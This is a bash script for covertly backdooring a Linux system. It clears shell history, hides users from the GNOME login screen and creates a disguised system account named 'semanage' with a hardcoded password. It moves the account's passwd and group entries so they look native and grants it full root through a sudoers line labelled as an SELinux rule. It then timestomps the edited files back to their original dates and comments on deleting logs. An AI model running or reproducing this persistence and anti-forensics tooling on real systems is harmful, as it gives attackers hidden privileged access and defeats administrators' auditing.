#!/bin/bash
# xargs so that if called with no options, interactive script runs, else with options they are used
# how to check system password reqs? can we disable need for password?
# /etc/login.defs
# what about PAM enforced policies?
# ex allows you to use vim-like commands


# prevent hist file from recording these events
HISTSIZE=0
unset HISTFILE


# get mod time of files to be changed before changing them
passwd_time=$(ls -l /etc/passwd | cut -d " " -f 6-8)
shadow_time=$(ls -l /etc/shadow | cut -d " " -f 6-8)
group_time=$(ls -l /etc/group | cut -d " " -f 6-8)
sudoers_time=$(ls -l /etc/sudoers | cut -d " " -f 6-8)
loginscreen_time=$(ls -ld /root | cut -d " " -f 6-8)
# /etc/dconf/db/gdm.d/00-login-screen doesn't exist by default - we had to create it and want it to look like it was part of the OS install


# stop new user from being added to login screen menu?
echo -e "[org/gnome/login-screen]\n# Do not show the user lsit\ndisable-user-list=true" >> /etc/dconf/db/gdm.d/00-login-screen
#echo -e "user-db:user\nsystem-db:gdm\nfile-db:/usr/share/gdm/greeter-dconf-defaults" >> /etc/dconf/profile/gdm # maybe necessary for CentOS 8
dconf update


# user we will create
user="semanage"
password="SimplePass"


# create user
useradd --system --no-create-home $user
# although this does not create a home dir, it still lists as /home/$user in the /etc/passwd file

# system users who do not have a home dir show "/" in field 6 of /etc/passwd; we are doing the same
usermod --home=/ $user

# set password on user (this will update the modtime on the shadow file)
echo $password | passwd --stdin $user


# find entry in /etc/passwd
entry=$(grep $user /etc/passwd)

# get line number of our new entry
line=$(cat -n /etc/passwd | grep $user | awk '{print $1}')

# move the line to the position after the static line 22
ex /etc/passwd<<<"$(echo $line)m22|wq"
ex /etc/group<<<"$(echo $line)m22|wq"


# give sudo rights by editing /etc/sudoers
# the advantage to this method as opposed to adding to wheel group is that it appears as though the user has no secondary groups when viewing /etc/group

cat << EOM >> /etc/sudoers
## Allows SELinux to do things
%$user  ALL=(ALL)   ALL
EOM


# time stomping to original modtime
touch --date="$passwd_time" /etc/passwd
touch --date="$shadow_time" /etc/shadow
touch --date="$group_time" /etc/group
touch --date="$sudoers_time" /etc/sudoers
touch --date="$loginscreen_time" /etc/dconf/db/gdm.d/00-login-screen

# delete log entries??
# shell reminder to delete this script after running